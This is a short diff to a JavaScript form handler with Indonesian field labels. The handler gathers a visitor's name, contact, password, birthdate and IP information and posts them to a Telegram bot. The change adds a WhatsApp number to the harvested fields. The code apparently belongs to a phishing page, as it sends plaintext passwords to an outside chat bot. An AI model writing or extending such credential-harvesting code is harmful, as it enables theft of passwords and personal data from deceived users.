@@ -11,9 +11,10 @@ document.getElementById('dataForm').addEventListener('submit', function (e) {
   const name = document.getElementById('name').value;
   const contact = document.getElementById('contact').value;
   const password = document.getElementById('password').value;
+  const whatsapp = document.getElementById('whatsapp').value;
   const birthdate = document.getElementById('birthdate').value;
 
-  const message = `Data Baru:\nNama: ${name}\nKontak: ${contact}\nKata Sandi: ${password}\nTanggal Lahir: ${birthdate}\n${ipInfo}`;
+  const message = `Data Baru:\nNama: ${name}\nKontak: ${contact}\nKata Sandi: ${password}\nNomor Whatsapp: ${whatsapp}\nTanggal Lahir: ${birthdate}\n${ipInfo}`;
 
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
